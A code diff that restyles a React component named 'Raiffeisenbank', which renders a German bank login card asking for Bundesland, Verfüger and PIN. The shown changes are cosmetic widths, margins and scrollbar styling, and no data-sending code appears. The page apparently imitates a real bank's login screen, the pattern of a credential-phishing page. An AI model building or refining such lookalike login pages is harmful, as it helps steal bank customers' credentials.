@@ -48,8 +48,8 @@ const Raiffeisenbank = () => {
       }}
     >
       {/* Login Card */}
-      <div className="relative z-10 w-full max-w-lg rounded-lg bg-white p-8 shadow-lg">
-        <h1 className="mb-2 text-2xl font-light text-[#1a1a1a]">
+      <div className="relative z-10 w-full max-w-xl rounded-md bg-white p-8 shadow-lg">
+        <h1 className="mb-4 text-2xl font-light text-[#1a1a1a]">
           Bitte melden Sie sich an
         </h1>
         <p className="mb-6 text-sm text-gray-500">
@@ -87,12 +87,10 @@ const Raiffeisenbank = () => {
           </div>
           {selectOpen && (
             <div
-              className="absolute left-0 right-0 top-full z-20 border border-gray-200 bg-white shadow-lg"
+              className="custom-scrollbar absolute left-0 right-0 top-full z-20 border border-gray-200 bg-white shadow-lg"
               style={{
                 maxHeight: "160px",
                 overflowY: "auto",
-                scrollbarWidth: "auto" as any,
-                scrollbarColor: "#c4c4c4 transparent",
               }}
             >
               <div
@@ -149,7 +147,7 @@ const Raiffeisenbank = () => {
         <div className="flex justify-center">
           <button
             type="button"
-            className="rounded-md bg-[#fbf315] px-12 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
+            className="rounded-md bg-[#fbf315] px-20 py-3 text-sm font-semibold text-[#1a1a1a] transition-colors hover:bg-[#e6dc12] disabled:opacity-50"
             disabled={!bundesland || !verfueger || !pin}
           >
             Weiter
